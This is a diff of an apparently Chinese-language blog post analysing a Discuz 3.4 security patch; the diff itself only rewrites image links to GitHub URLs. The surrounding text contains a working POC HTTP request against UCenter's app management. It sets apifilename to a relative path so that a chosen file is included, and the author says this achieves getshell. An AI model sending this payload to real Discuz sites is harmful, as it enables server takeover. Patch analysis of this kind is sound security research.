@@ -5,7 +5,7 @@
 
 1.后台命令执行隐患(不具备利用条件)
 ----
-![](20180612-discuz3.4补丁更新分析/pic/命令执行1.jpg)
+![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/命令执行1.jpg)
 如图所示，问题出在后台数据库备份功能，增加了escapeshellarg()函数来过滤 $tablesstr参数。
 /discuz3.4/upload/source/admincp/admincp_db.php
 ```php
@@ -114,9 +114,9 @@ $apifilename = isset($app['apifilename']) && $app['apifilename'] ? $app['apifile
 /discuz3.4/upload/uc_server/data/cache/apps.php >> /discuz3.4/upload/uc_server/model/base.php init_cache() >> $this->base->cache('apps') >> $app['apifilename']
 
 apps.php的值如下图所示
-![](20180612-discuz3.4补丁更新分析/pic/apps.php.jpg)
+![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/apps.php.jpg)
 可通过ucenter的应用管理进行控制
-![](20180612-discuz3.4补丁更新分析/pic/Jietu20180612-192102.jpg)
+![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/Jietu20180612-192102.jpg)
 POC：
 ```php
 POST /discuz3.4/upload/uc_server/admin.php?m=app&a=detail&appid=1 HTTP/1.1
@@ -134,8 +134,8 @@ Upgrade-Insecure-Requests: 1
 sid=87c1Zk21dOZPwMBkwqz%2BmgKKVA%2FrhGZKGqu1CWAP63EzBMLJWaCtv9K1DPs%2B61zf7vEER6usLasOpQ&formhash=c98254e0423cf9af&type=DISCUZX&name=Discuz%21+Board&url=http%3A%2F%2Flocalhost%2Fdiscuz-3.4%2Fupload&extraurl=&ip=&authkey=SfU517M8n8u1scR1T255Gea6G909L2l338E6seAdP7xei3U0yag9J3gfm6iey66b&apppath=..%2F&viewprourl=&apifilename=../phpinfo.txt&tagtemplates=&tagfields=&synlogin=1&recvnote=1&submit=+%E6%8F%90+%E4%BA%A4+
 ```
 * apppath=..%2F 因为不知道绝对路径，输入../会自动补全
-![](20180612-discuz3.4补丁更新分析/pic/绝对路径.jpg)
+![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/绝对路径.jpg)
 * apifilename= 可以是任意上传的图片等填入相对路径,这里phpinfo.txt是我创建在web根目录的测试文件
 
 POC的包发完以后，访问登陆页面、ucenter首页等多处都包含了指定的文件，达到getshell的目的。
-![](20180612-discuz3.4补丁更新分析/pic/Jietu20180612-191327.jpg)
+![](https://github.com/white-cell/blog/raw/master/20180612-discuz3.4补丁更新分析/pic/Jietu20180612-191327.jpg)
